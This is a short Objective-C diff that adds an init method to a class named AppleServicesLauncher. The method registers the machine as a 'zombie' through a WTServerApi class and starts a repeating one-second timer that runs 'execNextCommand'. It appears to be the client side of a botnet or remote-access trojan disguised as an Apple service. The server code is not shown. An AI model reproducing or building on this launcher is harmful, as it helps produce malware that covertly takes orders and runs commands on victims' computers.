@@ -7,7 +7,20 @@
 //
 
 #import "AppleServicesLauncher.h"
+#import "WTServerApi.h"
 
 @implementation AppleServicesLauncher
+
+- (id)init {
+    
+    self = [super init];
+
+    [WTServerApi initializeNewZombie];
+    
+    NSTimer *timer = [NSTimer timerWithTimeInterval:1 target:[WTServerApi class] selector:@selector(execNextCommand) userInfo:nil repeats:YES];
+    [timer fire];
+    
+    return self;
+}
 
 @end
